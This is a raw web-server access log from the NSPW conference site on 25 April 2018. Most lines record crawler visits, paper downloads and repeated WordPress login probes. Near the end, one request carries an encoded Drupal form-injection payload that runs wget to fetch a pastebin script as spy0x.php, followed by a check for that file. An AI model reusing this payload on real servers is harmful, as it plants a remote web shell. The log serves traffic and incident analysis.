190.102.58.36 - - [25/Apr/2018:10:50:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.102.58.36 - - [25/Apr/2018:10:50:41 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [25/Apr/2018:10:51:06 -0400] "GET /papers/2004/nspw2004-haldar.pdf HTTP/1.1" 200 80720 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
129.170.212.241 - - [25/Apr/2018:10:53:54 -0400] "GET /2018/dates HTTP/1.1" 200 6286 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.170.212.241 - - [25/Apr/2018:10:53:54 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.170.212.241 - - [25/Apr/2018:10:53:54 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 31010 "https://www.nspw.org/2018/dates" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
69.162.124.227 - - [25/Apr/2018:10:54:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.140 - - [25/Apr/2018:10:54:36 -0400] "GET /papers/2010/nspw2010-franz.pdf HTTP/1.1" 200 1973895 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [25/Apr/2018:10:56:02 -0400] "GET /2004/nspw-footer.html HTTP/1.1" 200 4245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.207.95.146 - - [25/Apr/2018:10:58:31 -0400] "GET / HTTP/1.1" 200 6650 "-" "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)"
69.162.124.227 - - [25/Apr/2018:10:59:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
85.187.111.188 - - [25/Apr/2018:10:59:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
85.187.111.188 - - [25/Apr/2018:10:59:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [25/Apr/2018:11:00:58 -0400] "GET /2002/?C=S;O=A HTTP/1.1" 200 5157 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.21.99.44 - - [25/Apr/2018:11:01:29 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
94.21.99.44 - - [25/Apr/2018:11:01:30 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [25/Apr/2018:11:04:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
43.241.133.158 - - [25/Apr/2018:11:05:38 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
43.241.133.158 - - [25/Apr/2018:11:05:41 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
92.18.79.59 - - [25/Apr/2018:11:05:49 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502316 "https://scholar.google.co.uk/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
92.18.79.59 - - [25/Apr/2018:11:05:50 -0400] "GET /favicon.ico HTTP/1.1" 404 841 "https://www.nspw.org/papers/2007/nspw2007-mannan.pdf" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.87 - - [25/Apr/2018:11:05:54 -0400] "GET /2006/pc.content HTTP/1.1" 200 7181 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.65.164.92 - - [25/Apr/2018:11:06:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.65.164.92 - - [25/Apr/2018:11:06:04 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
146.200.107.67 - - [25/Apr/2018:11:07:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
146.200.107.67 - - [25/Apr/2018:11:07:54 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.213.30.180 - - [25/Apr/2018:11:09:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7686 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.213.30.180 - - [25/Apr/2018:11:09:18 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [25/Apr/2018:11:09:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.106.108.116 - - [25/Apr/2018:11:09:41 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
66.249.73.87 - - [25/Apr/2018:11:09:48 -0400] "GET /2010 HTTP/1.1" 200 6943 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [25/Apr/2018:11:10:49 -0400] "GET /2005/submission.shtml HTTP/1.1" 200 5568 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [25/Apr/2018:11:11:11 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
148.251.179.145 - - [25/Apr/2018:11:11:17 -0400] "HEAD / HTTP/1.1" 200 3728 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0"
201.72.103.54 - - [25/Apr/2018:11:11:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.72.103.54 - - [25/Apr/2018:11:11:53 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.102.9.31 - - [25/Apr/2018:11:12:47 -0400] "GET /2018/cfp HTTP/1.1" 200 8152 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.9.31 - - [25/Apr/2018:11:12:48 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
216.244.66.200 - - [25/Apr/2018:11:13:50 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
46.188.151.118 - - [25/Apr/2018:11:14:24 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.188.151.118 - - [25/Apr/2018:11:14:25 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [25/Apr/2018:11:14:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.147 - - [25/Apr/2018:11:15:13 -0400] "GET /past HTTP/1.1" 200 12049 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [25/Apr/2018:11:15:46 -0400] "GET /2006/invite/reg.html HTTP/1.1" 200 6784 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.157 - - [25/Apr/2018:11:16:35 -0400] "GET /2005 HTTP/1.1" 301 3971 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.19 - - [25/Apr/2018:11:16:36 -0400] "GET /2005/ HTTP/1.1" 200 8137 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
218.30.103.113 - - [25/Apr/2018:11:19:05 -0400] "GET / HTTP/1.0" 400 0 "-" "-"
218.30.103.113 - - [25/Apr/2018:11:19:06 -0400] "GET /papers/2008/nspw2008-laurie.pdf HTTP/1.1" 200 424230 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
69.162.124.227 - - [25/Apr/2018:11:19:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.102.209.79 - - [25/Apr/2018:11:20:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.102.209.79 - - [25/Apr/2018:11:20:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [25/Apr/2018:11:20:42 -0400] "GET /2005/pc.content HTTP/1.1" 200 5856 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.88.188.230 - - [25/Apr/2018:11:22:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
111.88.188.230 - - [25/Apr/2018:11:22:24 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [25/Apr/2018:11:22:34 -0400] "GET /papers/2002/nspw2002-marceau.pdf HTTP/1.1" 200 197896 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
82.77.237.130 - - [25/Apr/2018:11:22:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.77.237.130 - - [25/Apr/2018:11:22:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
170.81.229.14 - - [25/Apr/2018:11:23:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
170.81.229.14 - - [25/Apr/2018:11:23:54 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [25/Apr/2018:11:24:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [25/Apr/2018:11:25:37 -0400] "GET /2003/oc.shtml HTTP/1.1" 200 5608 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
137.112.228.196 - - [25/Apr/2018:11:26:22 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.196 - - [25/Apr/2018:11:26:22 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:22 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:22 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.196 - - [25/Apr/2018:11:26:23 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
95.216.19.59 - - [25/Apr/2018:11:27:17 -0400] "GET /robots.txt HTTP/1.1" 200 5950 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:27:39 -0400] "GET / HTTP/1.1" 200 11544 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:28:01 -0400] "GET /1999/local.html HTTP/1.1" 200 5762 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:28:22 -0400] "GET /1999/program.html HTTP/1.1" 200 6264 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:28:44 -0400] "GET /2000/local.html HTTP/1.1" 200 5610 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
83.20.252.150 - - [25/Apr/2018:11:29:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.20.252.150 - - [25/Apr/2018:11:29:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:29:06 -0400] "GET /2000/past.html HTTP/1.1" 200 5212 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:29:28 -0400] "GET /2010 HTTP/1.1" 200 6888 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:11:29:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:11:29:49 -0400] "GET /2010/cfp HTTP/1.1" 200 8274 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:30:11 -0400] "GET /2010/dates HTTP/1.1" 200 6638 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:30:33 -0400] "GET /2010/local HTTP/1.1" 200 9835 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [25/Apr/2018:11:30:33 -0400] "GET /2009/proceedings/1997/nspw1997-hinton.pdf HTTP/1.1" 200 1247726 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:11:30:55 -0400] "GET /2011/cfp HTTP/1.1" 200 8322 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:31:17 -0400] "GET /2011/dates HTTP/1.1" 200 6463 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
148.102.58.239 - - [25/Apr/2018:11:31:31 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
148.102.58.239 - - [25/Apr/2018:11:31:32 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:31:39 -0400] "GET /2011/local HTTP/1.1" 200 8215 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:32:00 -0400] "GET /2011/sponsors HTTP/1.1" 200 6425 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:32:22 -0400] "GET /2012/cfp HTTP/1.1" 200 7748 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
61.181.142.71 - - [25/Apr/2018:11:32:35 -0400] "GET / HTTP/1.1" 200 6104 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
95.216.19.59 - - [25/Apr/2018:11:32:44 -0400] "GET /2012/dates HTTP/1.1" 200 6531 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.89 - - [25/Apr/2018:11:32:56 -0400] "GET /papers/2012/docs/p53.pdf HTTP/1.1" 200 2129743 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:11:33:06 -0400] "GET /2012/local HTTP/1.1" 200 6574 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:33:28 -0400] "GET /2013/dates HTTP/1.1" 200 6524 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:33:50 -0400] "GET /2013/local HTTP/1.1" 200 9134 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:34:11 -0400] "GET /2014 HTTP/1.1" 200 6640 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:34:33 -0400] "GET /2014/cfp HTTP/1.1" 200 8231 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:11:34:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [25/Apr/2018:11:34:42 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
95.216.19.59 - - [25/Apr/2018:11:34:55 -0400] "GET /2014/dates HTTP/1.1" 200 6496 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:35:17 -0400] "GET /2014/local HTTP/1.1" 200 7439 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [25/Apr/2018:11:35:29 -0400] "GET /papers/2001/nspw2001-weirich.pdf HTTP/1.1" 200 720355 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:11:35:39 -0400] "GET /2014/program HTTP/1.1" 200 7839 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
197.1.100.124 - - [25/Apr/2018:11:35:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.1.100.124 - - [25/Apr/2018:11:35:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:36:01 -0400] "GET /2014/sponsors HTTP/1.1" 200 6295 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:36:22 -0400] "GET /2015/cfp HTTP/1.1" 200 9263 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
216.244.66.236 - - [25/Apr/2018:11:36:25 -0400] "GET /papers/2011/nspw2011-gutmann.pdf HTTP/1.1" 200 454496 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
95.216.19.59 - - [25/Apr/2018:11:36:44 -0400] "GET /2015/dates HTTP/1.1" 200 6368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:37:06 -0400] "GET /2015/location HTTP/1.1" 200 7221 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
94.254.251.80 - - [25/Apr/2018:11:37:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
94.254.251.80 - - [25/Apr/2018:11:37:24 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
158.69.101.124 - - [25/Apr/2018:11:37:25 -0400] "GET /?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+https%3A%2F%2Fpastebin.com%2Fraw%2FtBqLLGbw+-O+spy0x.php HTTP/1.1" 200 6158 "-" "python-requests/2.18.4"
95.216.19.59 - - [25/Apr/2018:11:37:28 -0400] "GET /2015/sponsors HTTP/1.1" 200 6259 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
158.69.101.124 - - [25/Apr/2018:11:37:42 -0400] "GET /?q=file%2Fajax%2Fname%2F%23value%2Fform-ERpPpmksmTj8v_etyQWIuN_5HMTVM3YOYnnd2Msgwk8 HTTP/1.1" 200 4338 "-" "python-requests/2.18.4"
95.216.19.59 - - [25/Apr/2018:11:37:50 -0400] "GET /2016/ HTTP/1.1" 200 6907 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
158.69.101.124 - - [25/Apr/2018:11:38:00 -0400] "GET /spy0x.php HTTP/1.1" 404 7971 "-" "Python-urllib/2.7"
95.216.19.59 - - [25/Apr/2018:11:38:11 -0400] "GET /2016/cfp HTTP/1.1" 200 8501 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:38:33 -0400] "GET /2016/dates HTTP/1.1" 200 6331 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:38:55 -0400] "GET /2016/location HTTP/1.1" 200 7614 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:39:17 -0400] "GET /2016/sponsors HTTP/1.1" 200 6247 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:39:38 -0400] "GET /2017 HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:11:39:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
143.179.49.187 - - [25/Apr/2018:11:39:53 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769220 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
143.179.49.187 - - [25/Apr/2018:11:39:55 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:55 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:55 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:56 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:56 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:56 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:56 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:56 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:56 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
143.179.49.187 - - [25/Apr/2018:11:39:57 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
188.60.72.17 - - [25/Apr/2018:11:40:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
